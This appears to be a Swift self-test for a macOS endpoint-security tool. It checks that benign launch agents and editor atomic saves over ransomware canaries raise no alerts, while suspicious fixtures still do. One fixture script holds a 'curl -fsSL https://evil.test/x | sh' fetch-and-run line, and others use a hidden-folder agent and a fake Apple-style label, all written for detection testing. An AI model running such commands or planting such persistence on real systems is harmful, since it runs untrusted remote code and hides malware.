import Foundation
import RampartShared
import RampartBehaviour

// False-positive regression checks (launch items seen on a real Mac, canary atomic saves).
extension SelfTest {
    static func fp1Checks() {
        let fm = FileManager.default
        let root = NSHomeDirectory() + "/RampartSelfTestFP1-\(getpid())"
        defer { try? fm.removeItem(atPath: root) }
        try? fm.createDirectory(atPath: root + "/Bridge", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: root + "/Greeter/tools", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: root + "/deepfield-worker", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: root + "/Ember Apps/BatteryMonitor", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: root + "/LaunchAgents", withIntermediateDirectories: true)
        func write(_ p: String, _ s: String) { fm.createFile(atPath: p, contents: Data(s.utf8)) }
        write(root + "/Bridge/bots-chrome.sh", "#!/bin/sh\nexec /usr/bin/open -a Chrome http://localhost:8080\n")
        write(root + "/Bridge/waker.py", "import time\nwhile True:\n    time.sleep(60)\n")
        write(root + "/Bridge/server.py", "import http.server\nprint('serve')\n")
        write(root + "/Greeter/tools/pibackup.sh", "#!/bin/sh\nrsync -a pi.test:/home/ \"$HOME/PiBackups/\"\n")
        write(root + "/deepfield-worker/server.py", "print('worker')\n")
        write(root + "/Ember Apps/BatteryMonitor/main.py", "print('battery')\n")
        // Unsigned for everything outside the sealed system and /usr/bin.
        let signing: SigningProvider = { p in
            p.hasPrefix("/usr/bin/") || p.hasPrefix("/bin/") || p.hasPrefix("/System/") ? SigningInfo(status: .apple) : SigningInfo(status: .unsigned)
        }
        func plist(_ name: String, _ d: [String: Any]) -> PersistenceRecord? {
            let p = root + "/LaunchAgents/" + name
            guard let data = try? PropertyListSerialization.data(fromPropertyList: d, format: .xml, options: 0) else { return nil }
            fm.createFile(atPath: p, contents: data)
            return PersistenceScanner.parseLaunchdPlist(path: p, kind: .launchAgent)
        }
        let items: [PersistenceRecord] = [
            PersistenceRecord(item: PersistenceItem(kind: .launchAgent, label: "app.rampart.agent", location: "/Library/LaunchAgents/app.rampart.agent.plist",
                                                    target: "/Applications/Rampart.app/Contents/MacOS/Rampart"),
                              arguments: ["/Applications/Rampart.app/Contents/MacOS/Rampart", "--background"], attributes: ["runAtLoad": "1", "keepAlive": "1"]),
            PersistenceRecord(item: PersistenceItem(kind: .launchDaemon, label: "app.rampart.daemon", location: "/Library/LaunchDaemons/app.rampart.daemon.plist",
                                                    target: "/Library/PrivilegedHelperTools/app.rampart.daemon"),
                              arguments: ["/Library/PrivilegedHelperTools/app.rampart.daemon"], attributes: ["runAtLoad": "1", "keepAlive": "1"]),
            plist("com.aran.chatbridge-bots.plist", ["Label": "com.aran.chatbridge-bots", "ProgramArguments": [root + "/Bridge/bots-chrome.sh"], "RunAtLoad": true]),
            plist("com.aran.chatbridge-waker.plist", ["Label": "com.aran.chatbridge-waker", "ProgramArguments": ["/usr/bin/python3", root + "/Bridge/waker.py"],
                                                      "KeepAlive": true, "RunAtLoad": true, "EnvironmentVariables": ["PATH": "/opt/homebrew/bin:/usr/bin:/bin"]]),
            plist("com.aran.chatbridge.plist", ["Label": "com.aran.chatbridge", "ProgramArguments": ["/usr/bin/python3", root + "/Bridge/server.py"], "KeepAlive": true, "RunAtLoad": true]),
            plist("com.aran.pibackup.plist", ["Label": "com.aran.pibackup", "ProgramArguments": ["/bin/sh", root + "/Greeter/tools/pibackup.sh"],
                                              "StartCalendarInterval": ["Hour": 3, "Minute": 30]]),
            plist("com.arankeyhan.deepfield-worker.plist", ["Label": "com.arankeyhan.deepfield-worker", "ProgramArguments": ["/usr/bin/python3", root + "/deepfield-worker/server.py"], "KeepAlive": true, "RunAtLoad": true]),
            plist("com.ember.batterymonitor.plist", ["Label": "com.ember.batterymonitor", "ProgramArguments": ["/usr/bin/python3", root + "/Ember Apps/BatteryMonitor/main.py"], "KeepAlive": true, "RunAtLoad": true]),
        ].compactMap { $0 }
        check(items.count == 8, "fp1: 8 real-world launch item fixtures parsed")
        let engine = BehaviourEngine(signing: signing)
        let found = engine.evaluatePersistence(added: items)
        check(found.allSatisfy { $0.confidence < 30 }, "fp1: user's own + RamPart launch items raise no alert (max \(found.map(\.confidence).max() ?? 0))")
        check(!found.contains { $0.confidence >= 60 }, "fp1: zero alerts for the 8 items")
        check(!engine.reviewPersistence(Array(items.prefix(2))).contains { $0.finding.ruleID.hasPrefix("R07") }, "fp1: RamPart's own labels never assessed as R07")
        check(engine.reviewPersistence(Array(items.dropFirst(2))).allSatisfy { $0.finding.ruleID == "R07L" }, "fp1: home-folder unsigned scripts are R07L (log only)")

        // Genuinely suspicious items still alert.
        try? fm.createDirectory(atPath: root + "/.hidden", withIntermediateDirectories: true)
        write(root + "/.hidden/agent", "#!/bin/sh\necho hi\n")
        write(root + "/Bridge/update.sh", "#!/bin/sh\ncurl -fsSL https://evil.test/x | sh\n")
        let bad = [
            plist("com.rampart.test.hidden.plist", ["Label": "com.rampart.test.hidden", "ProgramArguments": [root + "/.hidden/agent"], "RunAtLoad": true]),
            plist("com.rampart.test.curl.plist", ["Label": "com.rampart.test.curl", "ProgramArguments": ["/bin/sh", root + "/Bridge/update.sh"], "RunAtLoad": true]),
            plist("com.apple.rampart.test.fake.plist", ["Label": "com.apple.rampart.test.fake", "ProgramArguments": [root + "/Bridge/server.py"], "RunAtLoad": true]),
        ].compactMap { $0 }
        let e2 = BehaviourEngine(signing: signing)
        let alerts = e2.evaluatePersistence(added: bad)
        check(alerts.filter { $0.confidence >= 60 }.count == 3, "fp1: hidden-folder, curl|sh and Apple-like label fixtures still alert (\(alerts.map(\.confidence)))")
        // Fake RamPart label pointing elsewhere is not treated as our own.
        let fake = PersistenceRecord(item: PersistenceItem(kind: .launchAgent, label: "app.rampart.evil", location: root + "/LaunchAgents/app.rampart.evil.plist",
                                                           target: "/private/tmp/rampart.test.payload"), arguments: ["/private/tmp/rampart.test.payload"])
        check(!PersistenceAssessor.isRampartOwn(fake), "fp1: app.rampart.* label with a foreign target is not trusted")

        // Canary + atomic save by a GUI editor.
        let docs = root + "/Documents"
        try? fm.createDirectory(atPath: docs, withIntermediateDirectories: true)
        let rw = RansomwareDetector(config: RansomwareConfig(protectedRoots: [docs]))
        let planted = rw.plantCanaries(in: [docs])
        check(planted.count == 2, "fp1: canaries planted only when asked")
        let canary = planted[0]
        let tmp = docs + "/.sb-1a2b3c4d-XyZ123"
        write(tmp, "{\\rtf1\\ansi edited by the user\\par}" + String(repeating: " ", count: 2048))
        try? fm.removeItem(atPath: canary); try? fm.moveItem(atPath: tmp, toPath: canary)
        let editor = ProcessInfoLite(pid: 4242, ppid: 1, path: "/System/Applications/TextEdit.app/Contents/MacOS/TextEdit", uid: 501, isPlatformBinary: true)
        let ren = SecurityEvent(kind: .fileRename, process: editor, path: tmp, destPath: canary, source: "eslogger")
        check(rw.observe(ren, actorKey: "p:1", trustedGUIActor: true).filter { $0.ruleID == "R01" }.isEmpty, "fp1: GUI atomic save over a canary is ignored")
        let e3 = BehaviourEngine(signing: signing, ransomware: rw)
        check(e3.process(SecurityEvent(kind: .fileRename, process: editor, path: tmp, destPath: canary, source: "eslogger")).isEmpty, "fp1: engine: no R01/R39 for editor atomic save")
        // An unsigned tool overwriting the canary still trips R01.
        write(canary, "encrypted?" + String(repeating: "x", count: 3000))
        let bin = ProcessInfoLite(pid: 4343, ppid: 1, path: root + "/rampart.test.locker", uid: 501)
        let hits = rw.observe(SecurityEvent(kind: .fileWrite, process: bin, path: canary, source: "eslogger"), actorKey: "p:2")
        check(hits.contains { $0.ruleID == "R01" }, "fp1: non-atomic canary modification still detected")
        let removed = rw.removeCanaries(planted)
        check(removed.count == 1 && fm.fileExists(atPath: canary), "fp1: removeCanaries deletes only files still holding RamPart's decoy body")
        let other = docs + "/notes.rtf"; write(other, "user file")
        check(rw.removeCanaries([other]).isEmpty && fm.fileExists(atPath: other), "fp1: removeCanaries never deletes non-canary files")
    }
}
